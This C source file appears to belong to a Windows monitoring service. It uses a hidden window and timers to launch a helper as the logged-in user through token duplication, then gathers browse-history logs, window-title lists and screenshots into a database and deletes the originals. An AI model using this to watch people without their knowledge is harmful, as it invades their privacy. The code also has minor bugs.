#include "timers.h"

const WCHAR g_wszClassName[] = L"MONKEY_TIMER_MESSAGE_WINDOW";

// Launches TimerProcs 1 and 2 in a loop for a message-only window, which, while blocking indefinitely, will not hog resources
DWORD CALLBACK TimerWrapThread(LPVOID lpHinstance)
{
	HWND hWnd;
	WNDCLASSEXW wcex;
	MSG Msg;
	HINSTANCE hInstance = *(HINSTANCE *)lpHinstance;
	PROGRAM_OPTIONS opt;
	ZeroMemory(&wcex, sizeof(WNDCLASSEXW));

	ReadRegistrySettings(&opt);

	wcex.cbSize = sizeof(WNDCLASSEXW);
	wcex.hInstance = hInstance;
	wcex.lpszClassName = g_wszClassName;
	wcex.lpfnWndProc = DefWindowProcW;
	RegisterClassExW(&wcex);

	hWnd = CreateWindowExW(0, g_wszClassName, L"", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);
	ShowWindow(hWnd, SW_HIDE);

	SetTimer(hWnd, IDT_TIMER1, opt.dwInterval, TimerProc1);
	SetTimer(hWnd, IDT_TIMER2, opt.dwInterval, TimerProc2);

	while(GetMessageW(&Msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&Msg);
		DispatchMessageW(&Msg);
	}

	return Msg.wParam;
}

// Timer Proc #1: launch the mticker stub as the currently active user
VOID CALLBACK TimerProc1(
	HWND hWnd,
	UINT_PTR nID,
	UINT uElapse,
	DWORD dwTime
)
{
	HANDLE hToken, hDupToken;
	DWORD dwSessionID;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	CHAR wAppPath[MAX_PATH];
	PROGRAM_OPTIONS opt;
	UINT uLen;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = L"winsta0\\default";

	dwSessionID = WTSGetActiveConsoleSessionId();
	WTSQueryUserToken(dwSessionID, &hToken);

	DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &hDupToken);
	ImpersonateLoggedOnUser(hDupToken);

	ReadRegistrySettings(&opt);
	StringCchLengthA(opt.wUserDir, MAX_PATH, &uLen);

	StringCchLengthA(opt.wUserDir, MAX_PATH, &uLen);

	StringCchPrintfA(wAppPath, MAX_PATH, "%smticker.exe", opt.wUserDir);
	/*{
		UINT uLen;
		DWORD dwWritten;
		HANDLE hFile = CreateFileA("C:\\Temp\\mdbg.txt", GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		BYTE bBom[2] = { 0xFF, 0xFE };
		StringCbLengthW(wAppPath, MAX_PATH * sizeof(WCHAR), &uLen);
		WriteFile(hFile, bBom, 2, &dwWritten, NULL);
		SetFilePointer(hFile, 0, NULL, FILE_END);
		WriteFile(hFile, wAppPath, uLen, &dwWritten, NULL);
		CloseHandle(hFile);
	}*/
	CreateProcessAsUserA(hDupToken, wAppPath, opt.wUserDir, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, opt.wUserDir, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	RevertToSelf();

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

}

// Timer Proc #2: write to the aurora database
VOID CALLBACK TimerProc2(
	HWND hWnd,
	UINT_PTR nID,
	UINT uElapse,
	DWORD dwTime
)
{
	HANDLE hFile;
	WIN32_FIND_DATAA wfdA;
	CHAR szPattern[MAX_PATH];
	WCHAR wzFileName[MAX_PATH];
	PROGRAM_OPTIONS opt;
	ReadRegistrySettings(&opt);

	// PathCch* is Unicode only, sadly.
	StringCchPrintfA(szPattern, MAX_PATH, "%s\\*", opt.wAppDir);
	hFile = FindFirstFileA(szPattern, &wfdA);
	if(hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			if((wfdA.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
			{
				UINT uLen;
				StringCchLengthA(wfdA.cFileName, MAX_PATH, &uLen);
				if(uLen > 5)
				{
					if(_strcmpi(wfdA.cFileName + (uLen - 4), ".log") == 0)
					{
						HANDLE hLog;
						StringCchPrintfW(wzFileName, MAX_PATH, L"%S", wfdA.cFileName);
						InsertBrowseHistory(wzFileName);
						
						// Zero out the log file
						// Maybe play with mutexes if this doesn't work
						hLog = CreateFileW(wzFileName, GENERIC_WRITE | GENERIC_READ, 0, NULL, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
						if(hLog != INVALID_HANDLE_VALUE)
						{
							CloseHandle(hLog);
						}
					}
					else if(_strcmpi(wfdA.cFileName + (uLen - 4), ".txt") == 0)
					{
						WCHAR wFullPath[MAX_PATH];
						//MultiByteToWideChar(CP_ACP, 0, wfdA.cFileName, -1, wzFileName, MAX_PATH);
						StringCchPrintfW(wzFileName, MAX_PATH, L"%S", wfdA.cFileName);
						StringCchPrintfW(wFullPath, MAX_PATH, L"%S\\%s", opt.wAppDir, wzFileName);
						InsertTitleList(wFullPath);
						DeleteFileW(wFullPath);
					}
					else if(_strcmpi(wfdA.cFileName + (uLen - 4), ".jpg") == 0)
					{
						WCHAR wFullPath[MAX_PATH];
						//MultiByteToWideChar(CP_ACP, 0, wfdA.cFileName, -1, wzFileName, MAX_PATH);
						StringCchPrintfW(wzFileName, MAX_PATH, L"%S", wfdA.cFileName);
						StringCchPrintfW(wFullPath, MAX_PATH, L"%S\\%s", opt.wAppDir, wzFileName);
						InsertScreenshot(wFullPath);
						DeleteFileW(wFullPath);
					}
				}
			}
		}
		while(FindNextFileA(hFile, &wfdA));
		FindClose(hFile);
	}
}
